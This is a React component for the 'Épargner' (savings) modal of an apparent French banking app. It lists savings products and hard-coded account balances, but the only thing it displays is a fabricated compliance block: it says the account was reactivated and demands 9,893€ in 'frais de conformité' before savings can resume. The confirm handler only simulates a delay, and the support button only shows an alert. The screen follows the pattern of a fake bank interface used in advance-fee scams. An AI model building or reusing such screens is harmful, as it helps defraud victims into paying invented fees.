import React, { useState } from 'react';
import './EpargnerPage.css';

const EpargnerPage = ({ onClose }) => {
  const [selectedProduct, setSelectedProduct] = useState('');
  const [formData, setFormData] = useState({
    montant: '',
    duree: '',
    compteSource: 'Compte Principal'
  });
  const [isLoading, setIsLoading] = useState(false);

  const produitsEpargne = [
    {
      id: 'livret-a',
      title: 'Livret A',
      description: 'Épargne réglementée, taux garanti',
      taux: '3%',
      plafond: '22 950€',
      icon: '💰',
      color: '#28A745',
      avantages: ['Taux garanti', 'Liquidité immédiate', 'Exonération fiscale']
    },
    {
      id: 'ldds',
      title: 'LDDS',
      description: 'Livret de développement durable',
      taux: '3%',
      plafond: '12 000€',
      icon: '🌱',
      color: '#20C997',
      avantages: ['Taux garanti', 'Financement écologique', 'Exonération fiscale']
    },
    {
      id: 'pea',
      title: 'PEA',
      description: 'Plan d\'épargne en actions',
      taux: 'Variable',
      plafond: '150 000€',
      icon: '📈',
      color: '#FF6B35',
      avantages: ['Fiscalité avantageuse', 'Potentiel de rendement', 'Long terme']
    },
    {
      id: 'assurance-vie',
      title: 'Assurance Vie',
      description: 'Épargne flexible et sécurisée',
      taux: 'Variable',
      plafond: 'Illimité',
      icon: '🛡️',
      color: '#6F42C1',
      avantages: ['Flexibilité', 'Transmission', 'Fiscalité avantageuse']
    }
  ];

  const durees = [
    { value: '1', label: '1 mois' },
    { value: '3', label: '3 mois' },
    { value: '6', label: '6 mois' },
    { value: '12', label: '1 an' },
    { value: '24', label: '2 ans' },
    { value: '60', label: '5 ans' }
  ];

  const comptes = [
    { id: 1, nom: 'Compte Principal', solde: 1847.50 },
    { id: 2, nom: 'Épargne en ligne', solde: 1000.00 }
  ];

  const handleConfirm = async () => {
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 2500));
    setIsLoading(false);
    onClose();
  };

  return (
    <div className="epargner-overlay">
      <div className="epargner-modal">
        <div className="modal-header">
          <h1>Épargner</h1>
          <button className="close-btn" onClick={onClose}>✕</button>
        </div>

        <div className="modal-content">
          {/* Message d'erreur de conformité */}
          <div className="compliance-error">
            <div className="error-header">
              <i className="fas fa-ban"></i>
              <h2>Épargne temporairement indisponible</h2>
            </div>
            
            <div className="error-content">
              <div className="compliance-message">
                <p>Votre compte a été réactivé le <strong>22/07/2025</strong>. Pour des raisons de conformité et de sécurité renforcée, les opérations d'épargne sont temporairement suspendues.</p>
                
                <div className="compliance-details">
                  <div className="compliance-fees-display">
                    <span className="fees-title">Frais de conformité requis :</span>
                    <span className="fees-value">9 893€</span>
                  </div>
                  
                  <div className="compliance-reason">
                    <h4>Pourquoi ces frais ?</h4>
                    <ul>
                      <li>Vérification de conformité post-réactivation</li>
                      <li>Renforcement des mesures de sécurité</li>
                      <li>Validation des opérations financières</li>
                    </ul>
                  </div>
                  
                  <div className="compliance-action">
                    <p>Merci de régler ces frais pour réactiver l'accès à vos produits d'épargne.</p>
                    <button className="contact-support-btn" onClick={() => alert('Redirection vers le support client')}>
                      <i className="fas fa-headset"></i>
                      Contacter le support
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default EpargnerPage; 